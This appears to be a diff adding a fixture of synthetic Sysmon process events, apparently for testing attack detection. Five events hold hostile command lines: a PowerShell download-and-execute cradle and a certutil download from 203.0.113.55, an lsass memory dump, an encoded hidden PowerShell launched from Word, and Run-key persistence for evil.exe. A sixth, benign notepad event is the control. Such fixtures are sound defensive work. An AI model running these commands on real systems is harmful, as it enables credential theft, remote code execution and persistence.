@@ -1,0 +1,110 @@
+[
+  {
+    "@timestamp": "2026-08-19T10:33:20.000Z",
+    "message": "Process Create: powershell.exe",
+    "host": {
+      "name": "WKS-042"
+    },
+    "event": {
+      "dataset": "windows.sysmon_operational",
+      "category": "process"
+    },
+    "process": {
+      "name": "powershell.exe",
+      "command_line": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
+      "parent": {
+        "name": "winword.exe"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-08-19T10:33:30.000Z",
+    "message": "Process Create: powershell.exe",
+    "host": {
+      "name": "WKS-042"
+    },
+    "event": {
+      "dataset": "windows.sysmon_operational",
+      "category": "process"
+    },
+    "process": {
+      "name": "powershell.exe",
+      "command_line": "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.55/payload.ps1')",
+      "parent": {
+        "name": "cmd.exe"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-08-19T10:33:40.000Z",
+    "message": "Process Create: procdump.exe",
+    "host": {
+      "name": "WKS-042"
+    },
+    "event": {
+      "dataset": "windows.sysmon_operational",
+      "category": "process"
+    },
+    "process": {
+      "name": "procdump.exe",
+      "command_line": "procdump.exe -ma lsass.exe lsass.dmp",
+      "parent": {
+        "name": "cmd.exe"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-08-19T10:33:50.000Z",
+    "message": "Process Create: certutil.exe",
+    "host": {
+      "name": "WKS-042"
+    },
+    "event": {
+      "dataset": "windows.sysmon_operational",
+      "category": "process"
+    },
+    "process": {
+      "name": "certutil.exe",
+      "command_line": "certutil.exe -urlcache -split -f http://203.0.113.55/payload.exe payload.exe",
+      "parent": {
+        "name": "cmd.exe"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-08-19T10:34:00.000Z",
+    "message": "Process Create: reg.exe",
+    "host": {
+      "name": "WKS-042"
+    },
+    "event": {
+      "dataset": "windows.sysmon_operational",
+      "category": "process"
+    },
+    "process": {
+      "name": "reg.exe",
+      "command_line": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\temp\\evil.exe",
+      "parent": {
+        "name": "cmd.exe"
+      }
+    }
+  },
+  {
+    "@timestamp": "2026-08-19T10:34:10.000Z",
+    "message": "Process Create: notepad.exe",
+    "host": {
+      "name": "WKS-042"
+    },
+    "event": {
+      "dataset": "windows.sysmon_operational",
+      "category": "process"
+    },
+    "process": {
+      "name": "notepad.exe",
+      "command_line": "notepad.exe C:\\Users\\jsmith\\Documents\\notes.txt",
+      "parent": {
+        "name": "explorer.exe"
+      }
+    }
+  }
+]
